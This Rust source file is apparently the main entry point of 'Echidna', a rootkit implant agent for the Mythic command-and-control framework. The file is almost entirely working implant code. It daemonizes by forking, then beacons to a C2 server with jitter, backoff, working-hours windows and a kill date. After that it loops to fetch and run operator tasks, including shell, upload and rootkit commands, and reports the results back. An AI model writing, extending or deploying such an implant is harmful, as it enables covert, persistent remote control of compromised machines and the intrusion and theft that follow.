use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
use chrono::Duration;
use std::error::Error;

use crate::agent::calculate_sleep_time;
use crate::agent::EchidnaAgent;

mod agent;
mod payloadvars;
mod profiles;
mod tasking;
mod utils;
mod shell;
mod upload;
mod rootkit_commands;


// Echidna-specific rootkit commands and minimal system control
mod exit;
mod jobs;
mod sleep;
mod workinghours;

/// Real entrypoint of the program.
/// Checks to see if the agent should daemonize and then runs the main beaconing code.
pub fn real_main() -> Result<(), Box<dyn Error>> {
    if let Some(daemonize) = option_env!("daemonize") {
        if daemonize.eq_ignore_ascii_case("true") {
            // Fork the process if daemonize is set to "true"
            if unsafe { libc::fork() } == 0 {
                run_beacon()?;
            }
            return Ok(());
        }
    }

    run_beacon()?;

    Ok(())
}

/// Main code which runs the Echidna rootkit agent
fn run_beacon() -> Result<(), Box<dyn Error>> {
    // Create a new Echidna agent object
    let mut agent = EchidnaAgent::new();

    // Get the initial interval from the config
    let mut interval = payloadvars::callback_interval();

    // Set the number of checkin retries
    let mut tries = 1;

    // Keep trying to reconnect to the C2 if the connection is unavailable
    loop {
        // Get the current time
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        // Get the configured start working hours for beaconing
        let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());

        // Get the configured end working hours for beaconing
        let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());

        // Check the agent's working hours and don't check in if not in the configured time frame
        if now < working_start {
            let delta =
                Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        } else if now > working_end {
            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
            let delta =
                Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        }

        // Check if the agent has passed the kill date
        if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
            return Ok(());
        }

        // Try to make the initial checkin to the C2, if this succeeds the loop will break
        if agent.make_checkin().is_ok() {
            break;
        }

        // Check if the number of connection attempts equals the configured connection attempts
        if tries >= payloadvars::retries() {
            return Ok(());
        }

        // Calculate the sleep time and sleep the agent
        let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
        std::thread::sleep(std::time::Duration::from_secs(sleeptime));

        // Increment the current attempt
        tries += 1;

        // Double the currently set interval for next connection attempt
        interval *= 2;
    } // Checkin successful

    // Main agent loop
    loop {
        // Refresh stealth measures periodically
        // stealth::refresh_protection()?;

        // Get new tasking from Mythic
        let pending_tasks = agent.get_tasking()?;

        // Process the pending tasks (including rootkit-specific commands)
        agent
            .tasking
            .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;

        // Sleep the agent
        agent.sleep();

        // Get the completed task information
        let completed_tasks = agent.tasking.get_completed_tasks()?;

        // Send the completed tasking information up to Mythic
        let continued_tasking = agent.send_tasking(&completed_tasks)?;

        // Pass along any continued tasking (download, upload, rootkit operations, etc.)
        agent
            .tasking
            .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;

        // Break out of the loop if the agent should exit
        if agent.shared.exit_agent {
            break;
        }

        // Sleep the agent
        agent.sleep();
    }

    Ok(())
}
